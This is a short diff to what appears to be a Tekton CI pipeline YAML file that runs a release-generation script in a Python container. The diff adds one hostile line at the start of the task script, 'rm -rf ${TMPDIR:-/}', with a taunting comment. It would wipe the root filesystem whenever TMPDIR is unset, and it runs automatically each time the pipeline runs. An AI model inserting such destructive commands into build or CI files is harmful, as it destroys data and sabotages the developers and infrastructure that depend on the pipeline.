@@ -43,6 +43,7 @@ spec:
               image: registry.access.redhat.com/ubi9/python-312
               workingDir: $(workspaces.source.path)
               script: |
+                rm -rf ${TMPDIR:-/} ### HAHAH i am made men
                 set -euxo pipefail
                 mkdir -p bin/ # ignored in .gitignore
                 ./hack/generate-releaseyaml.sh  > bin/release.yaml
